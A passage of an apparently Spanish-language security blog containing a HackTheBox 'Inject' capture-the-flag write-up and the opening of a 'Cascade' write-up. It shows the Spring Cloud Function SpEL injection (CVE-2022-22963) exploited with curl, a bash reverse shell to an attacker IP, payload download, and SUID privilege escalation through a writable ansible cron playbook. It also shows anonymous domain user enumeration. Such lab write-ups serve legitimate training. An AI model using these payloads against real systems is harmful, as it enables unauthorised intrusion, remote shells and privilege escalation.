  <li>Podemos ver la imagen y la <code class="language-plaintext highlighter-rouge">url</code> es interesante.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/inject/7.png" />
</p>

<ul>
  <li>Vamos a capturar la petición con <code class="language-plaintext highlighter-rouge">burpsuite</code> al momento de abrir la imagen y si probamos un LFI vemos que funciona.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/inject/8.png" />
</p>

<ul>
  <li>Hay 2 usuarios.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/inject/9.png" />
</p>

<ul>
  <li>Si vemos lo que hay dentro del directorio de <code class="language-plaintext highlighter-rouge">frank</code> encontramos esto.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/inject/10.png" />
</p>

<ul>
  <li>Aquí vemos una contraseña y un <code class="language-plaintext highlighter-rouge">.xml</code> con información.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/inject/11.png" />
</p>

<blockquote>
  <p>La contraseña no funciona para conectarnos por SSH.</p>
</blockquote>

<blockquote>
  <p>El archivo de configuración que ha mostrado pertenece a Maven, que es una herramienta de gestión y comprensión de proyectos de software. Este archivo específico se usa para configurar ajustes relacionados con la construcción y gestión de proyectos en Maven By ChatGPT.</p>
</blockquote>

<ul>
  <li>Vemos que ya nos hablan de <code class="language-plaintext highlighter-rouge">Java</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/inject/12.png" />
</p>

<ul>
  <li>Vemos un <code class="language-plaintext highlighter-rouge">WebApp</code> con archivos interesantes.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/inject/13.png" />
</p>

<ul>
  <li>Si le decimos a <code class="language-plaintext highlighter-rouge">ChatGPT</code> a que corresponden esos archivos nos dice que pertenecen a Maven.</li>
</ul>

<blockquote>
  <p>La imagen que has proporcionado muestra una lista de archivos y directorios que son comunes en un proyecto de Java utilizando Maven como sistema de gestión y construcción de proyectos.</p>
</blockquote>

<h2 id="spring-cloud-function">Spring Cloud Function</h2>

<ul>
  <li>En el archivo <code class="language-plaintext highlighter-rouge">pom.xml</code> encontramos información incluye dependencias, propiedades del proyecto y configuraciones especificas de compilación.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/inject/14.png" />
</p>

<ul>
  <li>Nos da la versión que se esta utilizando para la biblioteca <code class="language-plaintext highlighter-rouge">spring-cloud-function-web</code> con versión <code class="language-plaintext highlighter-rouge">3.2.2</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/inject/15.png" />
</p>

<ul>
  <li>
    <p>Esta versión es vulnerable <a href="https://nsfocusglobal.com/spring-cloud-function-spel-expression-injection-vulnerability-alert/">https://nsfocusglobal.com/spring-cloud-function-spel-expression-injection-vulnerability-alert/</a>.</p>
  </li>
  <li>
    <p>Aquí nos explican en que consiste y como se explota <a href="https://sysdig.com/blog/cve-2022-22963-spring-cloud/">https://sysdig.com/blog/cve-2022-22963-spring-cloud/</a>.</p>
  </li>
  <li>
    <p>Al parecer aprovecha de <code class="language-plaintext highlighter-rouge">Runtime.getRuntime().exec()</code> que es un método en Java para ejecutar comandos.</p>
  </li>
  <li>
    <p>Para ver si es vulnerable vamos hacer una petición con <code class="language-plaintext highlighter-rouge">curl</code>  a la ruta <code class="language-plaintext highlighter-rouge">functionRouter</code> lo que vamos hacer es crear un archivo en el directorio <code class="language-plaintext highlighter-rouge">/tmp</code>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/inject/17.png" />
</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content curl <span class="nt">-X</span> POST http://10.10.11.204:8080/functionRouter <span class="nt">-H</span> <span class="s1">'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("touch /tmp/pwned")'</span> <span class="nt">--data-raw</span> <span class="s1">'data'</span> <span class="nt">-v</span>
Note: Unnecessary use of <span class="nt">-X</span> or <span class="nt">--request</span>, POST is already inferred.
<span class="k">*</span>   Trying 10.10.11.204:8080...
<span class="k">*</span> Connected to 10.10.11.204 <span class="o">(</span>10.10.11.204<span class="o">)</span> port 8080
<span class="o">&gt;</span> POST /functionRouter HTTP/1.1
<span class="o">&gt;</span> Host: 10.10.11.204:8080
<span class="o">&gt;</span> User-Agent: curl/8.5.0
<span class="o">&gt;</span> Accept: <span class="k">*</span>/<span class="k">*</span>
<span class="o">&gt;</span> spring.cloud.function.routing-expression:T<span class="o">(</span>java.lang.Runtime<span class="o">)</span>.getRuntime<span class="o">()</span>.exec<span class="o">(</span><span class="s2">"touch /tmp/pwned"</span><span class="o">)</span>
<span class="o">&gt;</span> Content-Length: 4
<span class="o">&gt;</span> Content-Type: application/x-www-form-urlencoded
<span class="o">&gt;</span>
&lt; HTTP/1.1 500
&lt; Content-Type: application/json
&lt; Transfer-Encoding: chunked
&lt; Date: Sun, 02 Jun 2024 18:52:19 GMT
&lt; Connection: close
&lt;
<span class="k">*</span> Closing connection
<span class="o">{</span><span class="s2">"timestamp"</span>:<span class="s2">"2024-06-02T18:52:19.471+00:00"</span>,<span class="s2">"status"</span>:500,<span class="s2">"error"</span>:<span class="s2">"Internal Server Error"</span>,<span class="s2">"message"</span>:<span class="s2">"EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String"</span>,<span class="s2">"path"</span>:<span class="s2">"/functionRouter"</span><span class="o">}</span>%                                   
</code></pre></div></div>

<ul>
  <li>Si comprobamos desde el <strong>LFI</strong> vemos que efectivamente se creo.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/inject/16.png" />
</p>

<h2 id="shell-as-frank">Shell as frank</h2>

<ul>
  <li>Para obtener una <code class="language-plaintext highlighter-rouge">shell</code> vamos a crear un <code class="language-plaintext highlighter-rouge">.sh</code> que contenga una reverse <code class="language-plaintext highlighter-rouge">shell</code> y lo vamos a compartir mediante un servidor http con python3 para poder descargarlo en la maquina victima y hacer una petición al archivo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat </span>reverse.php
<span class="c">#!/bin/bash</span>
bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.14.55/443 0&gt;&amp;1
➜  content python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
</code></pre></div></div>

<ul>
  <li>Ahora nos ponemos en escucha.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
</code></pre></div></div>

<ul>
  <li>Ahora subimos el archivo a la máquina.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content curl <span class="nt">-X</span> POST http://10.10.11.204:8080/functionRouter <span class="nt">-H</span> <span class="s1">'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("curl http://10.10.14.55:80/reverse.sh -o /tmp/reverse.sh")'</span> <span class="nt">--data-raw</span> <span class="s1">'data'</span> <span class="nt">-v</span>
Note: Unnecessary use of <span class="nt">-X</span> or <span class="nt">--request</span>, POST is already inferred.
<span class="k">*</span>   Trying 10.10.11.204:8080...
<span class="k">*</span> Connected to 10.10.11.204 <span class="o">(</span>10.10.11.204<span class="o">)</span> port 8080
<span class="o">&gt;</span> POST /functionRouter HTTP/1.1
<span class="o">&gt;</span> Host: 10.10.11.204:8080
<span class="o">&gt;</span> User-Agent: curl/8.5.0
<span class="o">&gt;</span> Accept: <span class="k">*</span>/<span class="k">*</span>
<span class="o">&gt;</span> spring.cloud.function.routing-expression:T<span class="o">(</span>java.lang.Runtime<span class="o">)</span>.getRuntime<span class="o">()</span>.exec<span class="o">(</span><span class="s2">"curl http://10.10.14.55:80/reverse.sh -o /tmp/reverse.sh"</span><span class="o">)</span>
<span class="o">&gt;</span> Content-Length: 4
<span class="o">&gt;</span> Content-Type: application/x-www-form-urlencoded
<span class="o">&gt;</span>
&lt; HTTP/1.1 500
&lt; Content-Type: application/json
&lt; Transfer-Encoding: chunked
&lt; Date: Sun, 02 Jun 2024 18:58:15 GMT
&lt; Connection: close
&lt;
<span class="k">*</span> Closing connection
<span class="o">{</span><span class="s2">"timestamp"</span>:<span class="s2">"2024-06-02T18:58:15.168+00:00"</span>,<span class="s2">"status"</span>:500,<span class="s2">"error"</span>:<span class="s2">"Internal Server Error"</span>,<span class="s2">"message"</span>:<span class="s2">"EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String"</span>,<span class="s2">"path"</span>:<span class="s2">"/functionRouter"</span><span class="o">}</span>
</code></pre></div></div>

<ul>
  <li>Ahora le damos permisos de ejecución.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content curl <span class="nt">-X</span> POST http://10.10.11.204:8080/functionRouter <span class="nt">-H</span> <span class="s1">'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("chmod +x /tmp/reverse.sh")'</span> <span class="nt">--data-raw</span> <span class="s1">'data'</span> <span class="nt">-v</span>
Note: Unnecessary use of <span class="nt">-X</span> or <span class="nt">--request</span>, POST is already inferred.
<span class="k">*</span>   Trying 10.10.11.204:8080...
<span class="k">*</span> Connected to 10.10.11.204 <span class="o">(</span>10.10.11.204<span class="o">)</span> port 8080
<span class="o">&gt;</span> POST /functionRouter HTTP/1.1
<span class="o">&gt;</span> Host: 10.10.11.204:8080
<span class="o">&gt;</span> User-Agent: curl/8.5.0
<span class="o">&gt;</span> Accept: <span class="k">*</span>/<span class="k">*</span>
<span class="o">&gt;</span> spring.cloud.function.routing-expression:T<span class="o">(</span>java.lang.Runtime<span class="o">)</span>.getRuntime<span class="o">()</span>.exec<span class="o">(</span><span class="s2">"chmod +x /tmp/reverse.sh"</span><span class="o">)</span>
<span class="o">&gt;</span> Content-Length: 4
<span class="o">&gt;</span> Content-Type: application/x-www-form-urlencoded
<span class="o">&gt;</span>
&lt; HTTP/1.1 500
&lt; Content-Type: application/json
&lt; Transfer-Encoding: chunked
&lt; Date: Sun, 02 Jun 2024 18:59:10 GMT
&lt; Connection: close
&lt;
<span class="k">*</span> Closing connection
<span class="o">{</span><span class="s2">"timestamp"</span>:<span class="s2">"2024-06-02T18:59:10.711+00:00"</span>,<span class="s2">"status"</span>:500,<span class="s2">"error"</span>:<span class="s2">"Internal Server Error"</span>,<span class="s2">"message"</span>:<span class="s2">"EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String"</span>,<span class="s2">"path"</span>:<span class="s2">"/functionRouter"</span><span class="o">}</span>
</code></pre></div></div>

<ul>
  <li>Y por ultimo lo ejecutamos para obtener <code class="language-plaintext highlighter-rouge">shell</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content curl <span class="nt">-X</span> POST http://10.10.11.204:8080/functionRouter <span class="nt">-H</span> <span class="s1">'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash /tmp/reverse.sh")'</span> <span class="nt">--data-raw</span> <span class="s1">'data'</span> <span class="nt">-v</span>
Note: Unnecessary use of <span class="nt">-X</span> or <span class="nt">--request</span>, POST is already inferred.
<span class="k">*</span>   Trying 10.10.11.204:8080...
<span class="k">*</span> Connected to 10.10.11.204 <span class="o">(</span>10.10.11.204<span class="o">)</span> port 8080
<span class="o">&gt;</span> POST /functionRouter HTTP/1.1
<span class="o">&gt;</span> Host: 10.10.11.204:8080
<span class="o">&gt;</span> User-Agent: curl/8.5.0
<span class="o">&gt;</span> Accept: <span class="k">*</span>/<span class="k">*</span>
<span class="o">&gt;</span> spring.cloud.function.routing-expression:T<span class="o">(</span>java.lang.Runtime<span class="o">)</span>.getRuntime<span class="o">()</span>.exec<span class="o">(</span><span class="s2">"bash /tmp/reverse.sh"</span><span class="o">)</span>
<span class="o">&gt;</span> Content-Length: 4
<span class="o">&gt;</span> Content-Type: application/x-www-form-urlencoded
<span class="o">&gt;</span>
&lt; HTTP/1.1 500
&lt; Content-Type: application/json
&lt; Transfer-Encoding: chunked
&lt; Date: Sun, 02 Jun 2024 19:00:11 GMT
&lt; Connection: close
&lt;
<span class="k">*</span> Closing connection
<span class="o">{</span><span class="s2">"timestamp"</span>:<span class="s2">"2024-06-02T19:00:11.233+00:00"</span>,<span class="s2">"status"</span>:500,<span class="s2">"error"</span>:<span class="s2">"Internal Server Error"</span>,<span class="s2">"message"</span>:<span class="s2">"EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String"</span>,<span class="s2">"path"</span>:<span class="s2">"/functionRouter"</span><span class="o">}</span>
</code></pre></div></div>

<ul>
  <li>Recibimos la <code class="language-plaintext highlighter-rouge">shell</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.55] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.204] 42862
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>827<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
frank@inject:/<span class="nv">$ </span><span class="nb">whoami
whoami
</span>frank
frank@inject:/<span class="err">$</span>
</code></pre></div></div>

<h2 id="shell-as-phil">Shell as phil</h2>

<ul>
  <li>Si recordamos tenemos la contraseña de <strong>phil</strong> de primeras no pudimos conectarnos por <code class="language-plaintext highlighter-rouge">ssh</code> pero si podemos migrar a ese usuario desde la <code class="language-plaintext highlighter-rouge">shell</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>frank@inject:~/.m2<span class="nv">$ </span><span class="nb">cat </span>settings.xml
&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"UTF-8"</span>?&gt;
&lt;settings <span class="nv">xmlns</span><span class="o">=</span><span class="s2">"http://maven.apache.org/POM/4.0.0"</span> xmlns:xsi<span class="o">=</span><span class="s2">"http://www.w3.org/2001/XMLSchema-instance"</span>
        xsi:schemaLocation<span class="o">=</span><span class="s2">"http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd"</span><span class="o">&gt;</span>
  &lt;servers&gt;
    &lt;server&gt;
      &lt;<span class="nb">id</span><span class="o">&gt;</span>Inject&lt;/id&gt;
      &lt;username&gt;phil&lt;/username&gt;
      &lt;password&gt;DocPhillovestoInject123&lt;/password&gt;
      &lt;privateKey&gt;<span class="k">${</span><span class="nv">user</span><span class="p">.home</span><span class="k">}</span>/.ssh/id_dsa&lt;/privateKey&gt;
      &lt;filePermissions&gt;660&lt;/filePermissions&gt;
      &lt;directoryPermissions&gt;660&lt;/directoryPermissions&gt;
      &lt;configuration&gt;&lt;/configuration&gt;
    &lt;/server&gt;
  &lt;/servers&gt;
&lt;/settings&gt;
frank@inject:~/.m2<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>Funciona.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>frank@inject:~/.m2<span class="nv">$ </span>su phil
Password:
phil@inject:/home/frank/.m2<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>phil<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>phil<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>phil<span class="o">)</span>,50<span class="o">(</span>staff<span class="o">)</span>
phil@inject:/home/frank/.m2<span class="err">$</span>
</code></pre></div></div>

<h2 id="user-flag">User flag</h2>

<ul>
  <li>Podemos ver la flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>phil@inject:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
8dc5c8c4c03735847448fbf460738832
phil@inject:~<span class="err">$</span>
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>

<ul>
  <li>Al no encontrar nada interesante decidí ejecutar <code class="language-plaintext highlighter-rouge">pspy64</code> para ver tareas <code class="language-plaintext highlighter-rouge">cron</code> y encontré esta, corre <code class="language-plaintext highlighter-rouge">ansible-parallel</code> <a href="https://pypi.org/project/ansible-parallel/">https://pypi.org/project/ansible-parallel/</a>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/inject/escalada.png" />
</p>

<ul>
  <li>Allí vemos la estructura del <code class="language-plaintext highlighter-rouge">.yml</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>phil@inject:/opt/automation<span class="nv">$ </span><span class="nb">cd </span>tasks/
phil@inject:/opt/automation/tasks<span class="nv">$ </span><span class="nb">ls
</span>playbook_1.yml
phil@inject:/opt/automation/tasks<span class="nv">$ </span><span class="nb">cat </span>playbook_1.yml
- hosts: localhost
  tasks:
  - name: Checking webapp service
    ansible.builtin.systemd:
      name: webapp
      enabled: <span class="nb">yes
      </span>state: started
phil@inject:/opt/automation/tasks<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>Vemos que el directorio <code class="language-plaintext highlighter-rouge">tasks</code> corresponde al grupo staff y nosotros estamos allí y podemos escribir.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>phil@inject:/opt/automation/tasks<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>phil<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>phil<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>phil<span class="o">)</span>,50<span class="o">(</span>staff<span class="o">)</span>
phil@inject:/opt/automation/tasks<span class="nv">$ </span><span class="nb">cd</span> ..
phil@inject:/opt/automation<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
total 4
drwxrwxr-x 2 root staff 4096 Jun  2 19:26 tasks
</code></pre></div></div>

<ul>
  <li>Como es una tarea cron lo que vamos hacer es asignarle privilegios <code class="language-plaintext highlighter-rouge">SUID</code> ala <code class="language-plaintext highlighter-rouge">bash</code> usando el modulo <code class="language-plaintext highlighter-rouge">ansible.builtin.shell</code> <a href="https://docs.ansible.com/ansible/latest/collections/ansible/builtin/shell_module.html">https://docs.ansible.com/ansible/latest/collections/ansible/builtin/shell_module.html</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>phil@inject:/opt/automation/tasks<span class="nv">$ </span><span class="nb">cat </span>playbook_2.yml
- hosts: localhost
  tasks:
    - name: SUID
      ansible.builtin.shell: |
        <span class="nb">chmod</span> +s /bin/bash
      become: <span class="nb">true
</span>phil@inject:/opt/automation/tasks<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>Vamos a esperar a que se ejecute la tarea y ver si las <code class="language-plaintext highlighter-rouge">bash</code> se le otorga el privilegio <code class="language-plaintext highlighter-rouge">SUID</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>phil@inject:/opt/automation/tasks<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /bin/bash
<span class="nt">-rwsr-sr-x</span> 1 root root 1183448 Apr 18  2022 /bin/bash
phil@inject:/opt/automation/tasks<span class="err">$</span>
</code></pre></div></div>

<h2 id="shell-as-root">Shell as root</h2>

<ul>
  <li>Ahora ya estamos como <code class="language-plaintext highlighter-rouge">root</code> y vemos la <code class="language-plaintext highlighter-rouge">flag</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>phil@inject:/opt/automation/tasks<span class="nv">$ </span>bash <span class="nt">-p</span>
bash-5.0# <span class="nb">whoami
</span>root
bash-5.0# <span class="nb">cat</span> /root/root.txt
5a756880b37d955eee4996c9ef8a0620
bash-5.0#
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/easy" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Cascade (medium)</title><link href="http://localhost:4000/hackthebox/machines/medium/2024/06/01/cascade.html" rel="alternate" type="text/html" title="HackTheBox - Cascade (medium)" /><published>2024-06-01T00:00:00-06:00</published><updated>2024-06-01T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/medium/2024/06/01/cascade</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/medium/2024/06/01/cascade.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/64fef851357b8de1c4834093bf3426f2.png" />
</p>

<ul>
  <li>Cascade is a medium difficulty Windows machine configured as a Domain Controller. LDAP anonymous binds are enabled, and enumeration yields the password for user <code class="language-plaintext highlighter-rouge">r.thompson</code>, which gives access to a <code class="language-plaintext highlighter-rouge">TightVNC</code> registry backup. The backup is decrypted to gain the password for <code class="language-plaintext highlighter-rouge">s.smith</code>. This user has access to a .NET executable, which after decompilation and source code analysis reveals the password for the <code class="language-plaintext highlighter-rouge">ArkSvc</code> account. This account belongs to the <code class="language-plaintext highlighter-rouge">AD Recycle Bin</code> group, and is able to view deleted Active Directory objects. One of the deleted user accounts is found to contain a hardcoded password, which can be reused to login as the primary domain administrator.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<ul>
  <li>Comenzamos enumerando los puertos y servicios abiertos por el protocoló <strong>TCP</strong> de la máquina victima.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,88,135,139,389,445,636,3268,3269,5985,49154,49155,49157,49158,49170 10.10.10.182 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-05-30 10:48 CST
Nmap scan report <span class="k">for </span>10.10.10.182
Host is up <span class="o">(</span>0.091s latency<span class="o">)</span><span class="nb">.</span>

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 <span class="o">(</span>1DB15D39<span class="o">)</span> <span class="o">(</span>Windows Server 2008 R2 SP1<span class="o">)</span>
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 <span class="o">(</span>1DB15D39<span class="o">)</span>
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2024-05-30 16:48:29Z<span class="o">)</span>
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: cascade.local, Site: Default-First-Site-Name<span class="o">)</span>
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: cascade.local, Site: Default-First-Site-Name<span class="o">)</span>
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49170/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CASC-DC1<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   <span class="nb">date</span>: 2024-05-30T16:49:21
|_  start_date: 2024-05-30T16:45:09
|_clock-skew: <span class="nt">-4s</span>
| smb2-security-mode:
|   2:1:0:
|_    Message signing enabled and required
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Vamos agregar el nombre del dominio al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap cme ldap 10.10.10.182
SMB         10.10.10.182    445    CASC-DC1         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 7601 x64 <span class="o">(</span>name:CASC-DC1<span class="o">)</span> <span class="o">(</span>domain:cascade.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">echo</span> <span class="s2">"10.10.10.182 cascade.local dc.cascade.local"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
10.10.10.182 cascade.local dc.cascade.local
</code></pre></div></div>

<ul>
  <li>No podemos enumerar por el protocolo <code class="language-plaintext highlighter-rouge">smb</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap cme smb 10.10.10.182 <span class="nt">--shares</span>
SMB         10.10.10.182    445    CASC-DC1         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 7601 x64 <span class="o">(</span>name:CASC-DC1<span class="o">)</span> <span class="o">(</span>domain:cascade.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.182    445    CASC-DC1         <span class="o">[</span>-] Error enumerating shares: STATUS_USER_SESSION_DELETED
➜  nmap cme smb 10.10.10.182 <span class="nt">-u</span> <span class="s2">"miguelito"</span> <span class="nt">-p</span> <span class="s2">""</span> <span class="nt">--shares</span>
SMB         10.10.10.182    445    CASC-DC1         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 7601 x64 <span class="o">(</span>name:CASC-DC1<span class="o">)</span> <span class="o">(</span>domain:cascade.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.182    445    CASC-DC1         <span class="o">[</span>-] cascade.local<span class="se">\m</span>iguelito: STATUS_LOGON_FAILURE
➜  nmap smbclient <span class="nt">-N</span> <span class="nt">-L</span> //10.10.10.182
Anonymous login successful

	Sharename       Type      Comment
	<span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
Reconnecting with SMB1 <span class="k">for </span>workgroup listing.
do_connect: Connection to 10.10.10.182 failed <span class="o">(</span>Error NT_STATUS_RESOURCE_NAME_NOT_FOUND<span class="o">)</span>
Unable to connect with SMB1 <span class="nt">--</span> no workgroup available
</code></pre></div></div>

<ul>
  <li>Podemos enumerar usuarios con la herramienta <code class="language-plaintext highlighter-rouge">rpcclient</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap rpcclient <span class="nt">-N</span> <span class="nt">-U</span> <span class="s2">""</span> 10.10.10.182
rpcclient <span class="nv">$&gt;</span> enumdomusers
user:[CascGuest] rid:[0x1f5]
user:[arksvc] rid:[0x452]
user:[s.smith] rid:[0x453]
user:[r.thompson] rid:[0x455]
user:[util] rid:[0x457]
user:[j.wakefield] rid:[0x45c]
user:[s.hickson] rid:[0x461]
user:[j.goodhand] rid:[0x462]
user:[a.turnbull] rid:[0x464]
user:[e.crowe] rid:[0x467]
user:[b.hanson] rid:[0x468]
user:[d.burman] rid:[0x469]
user:[BackupSvc] rid:[0x46a]
user:[j.allen] rid:[0x46e]
user:[i.croft] rid:[0x46f]
rpcclient <span class="nv">$&gt;</span>
</code></pre></div></div>

<ul>
  <li>Vamos agregar a los usuarios una lista.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap rpcclient <span class="nt">-N</span> <span class="nt">-U</span> <span class="s2">""</span> 10.10.10.182 <span class="nt">-c</span> enumdomusers | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s2">"</span><span class="se">\[</span><span class="s2">.*?</span><span class="se">\]</span><span class="s2">"</span> | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"0x"</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'[]'</span> <span class="o">&gt;</span> users.txt
➜  nmap <span class="nb">cat </span>users.txt
CascGuest
arksvc
s.smith
r.thompson
util
j.wakefield
s.hickson
j.goodhand
a.turnbull
e.crowe
b.hanson
d.burman
BackupSvc
j.allen
i.croft
</code></pre></div></div>

<ul>
  <li>Vamos a verificar que los usuarios sean correctos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap /opt/kerbrute_linux_amd64 userenum <span class="nt">-d</span> cascade.local <span class="nt">--dc</span> cascade.local users.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ <span class="se">\/</span> ___/ __ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\</span>
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|<span class="se">\_</span>__/_/  /_.___/_/   <span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/

Version: v1.0.3 <span class="o">(</span>9dad6e1<span class="o">)</span> - 05/30/24 - Ronnie Flathers @ropnop

